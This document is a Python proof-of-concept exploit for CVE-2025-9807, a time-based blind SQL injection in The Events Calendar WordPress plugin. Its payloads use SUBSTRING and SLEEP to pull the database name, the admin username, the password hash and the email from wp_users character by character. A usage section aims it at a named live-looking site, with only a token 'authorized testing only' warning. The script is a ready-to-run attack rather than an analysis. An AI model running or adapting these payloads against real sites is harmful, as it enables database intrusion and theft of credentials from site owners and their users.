import requests
import time
import string
from urllib.parse import quote

def time_based_sqli(url, payload_template, charset=None, sleep_time=5, threshold=4):
    """
    Extract data using time-based blind SQLi
    
    Args:
        url: Target URL
        payload_template: SQL payload with {position} and {char} placeholders
        charset: Characters to test (default: all printable)
        sleep_time: SQL SLEEP duration
        threshold: Minimum delay to consider success
    """
    if charset is None:
        # Extended character set including uppercase, special chars
        charset = string.ascii_letters + string.digits + '_@.-!#$%&*+/=?^`{|}~'
    
    result = ""
    position = 1
    consecutive_failures = 0
    
    print(f"[*] Starting extraction with charset: {len(charset)} characters")
    print(f"[*] Sleep time: {sleep_time}s, Threshold: {threshold}s\n")
    
    while True:
        found = False
        
        # Test each character
        for char in charset:
            payload = payload_template.format(
                position=position, 
                char=char,
                sleep=sleep_time
            )
            test_url = f"{url}?s={quote(payload)}"
            
            start = time.time()
            try:
                response = requests.get(test_url, timeout=sleep_time + 5)
                elapsed = time.time() - start
                
                # If delayed, character found
                if elapsed >= threshold:
                    result += char
                    print(f"[+] Position {position}: '{char}' -> Current: {result}")
                    found = True
                    consecutive_failures = 0
                    break
                    
            except requests.exceptions.Timeout:
                # Timeout also indicates delay (character found)
                elapsed = time.time() - start
                if elapsed >= threshold:
                    result += char
                    print(f"[+] Position {position}: '{char}' (timeout) -> Current: {result}")
                    found = True
                    consecutive_failures = 0
                    break
                    
            except Exception as e:
                print(f"[!] Error testing '{char}': {e}")
                continue
        
        if not found:
            consecutive_failures += 1
            print(f"[-] Position {position}: No character found (failure {consecutive_failures}/3)")
            
            # Stop after 3 consecutive failures
            if consecutive_failures >= 3:
                print(f"[*] Stopping - likely end of string\n")
                break
        
        position += 1
        
        # Safety limit
        if position > 100:
            print("[!] Reached position limit (100)")
            break
    
    return result


def extract_data(base_url):
    """
    Main extraction function
    """
    print("="*60)
    print("CVE-2025-9807 - The Events Calendar SQLi PoC")
    print("="*60)
    print(f"Target: {base_url}\n")
    
    # 1. Extract database name
    print("[1] Extracting Database Name...")
    db_payload = "test' AND IF(SUBSTRING(DATABASE(),{position},1)='{char}',SLEEP({sleep}),0)-- -"
    db_name = time_based_sqli(base_url, db_payload)
    print(f"[✓] Database: {db_name}\n")
    
    # 2. Extract username
    print("[2] Extracting Admin Username...")
    user_payload = "test' AND IF(SUBSTRING((SELECT user_login FROM wp_users ORDER BY ID LIMIT 1),{position},1)='{char}',SLEEP({sleep}),0)-- -"
    username = time_based_sqli(base_url, user_payload)
    print(f"[✓] Username: {username}\n")
    
    # 3. Extract password hash
    print("[3] Extracting Password Hash...")
    pass_payload = "test' AND IF(SUBSTRING((SELECT user_pass FROM wp_users ORDER BY ID LIMIT 1),{position},1)='{char}',SLEEP({sleep}),0)-- -"
    # Password hash uses specific charset
    hash_charset = string.ascii_letters + string.digits + '$/.='
    password_hash = time_based_sqli(base_url, pass_payload, charset=hash_charset)
    print(f"[✓] Password Hash: {password_hash}\n")
    
    # 4. Extract email
    print("[4] Extracting Admin Email...")
    email_payload = "test' AND IF(SUBSTRING((SELECT user_email FROM wp_users ORDER BY ID LIMIT 1),{position},1)='{char}',SLEEP({sleep}),0)-- -"
    email = time_based_sqli(base_url, email_payload)
    print(f"[✓] Email: {email}\n")
    
    print("="*60)
    print("EXTRACTION COMPLETE")
    print("="*60)
    print(f"Database:      {db_name}")
    print(f"Username:      {username}")
    print(f"Password Hash: {password_hash}")
    print(f"Email:         {email}")
    print("="*60)
    
    return {
        'database': db_name,
        'username': username,
        'password_hash': password_hash,
        'email': email
    }


# ==================== USAGE ====================
if __name__ == "__main__":
    # Target URLs (pilih salah satu):
    # - https://app.fauzanghaza.com/events/
    # - https://app.fauzanghaza.com/?post_type=tribe_events&s=
    # - https://app.fauzanghaza.com/events/list/
    
    TARGET_URL = "https://app.fauzanghaza.com/events/list/"
    
    print("\n⚠️  WARNING: This is for authorized testing only!")
    print("Ensure you have permission to test this system.\n")
    
    input("Press Enter to continue...")
    
    try:
        results = extract_data(TARGET_URL)
        
        # Save results
        with open('sqli_results.txt', 'w') as f:
            for key, value in results.items():
                f.write(f"{key}: {value}\n")
        
        print("\n[✓] Results saved to sqli_results.txt")
        
    except KeyboardInterrupt:
        print("\n\n[!] Extraction interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")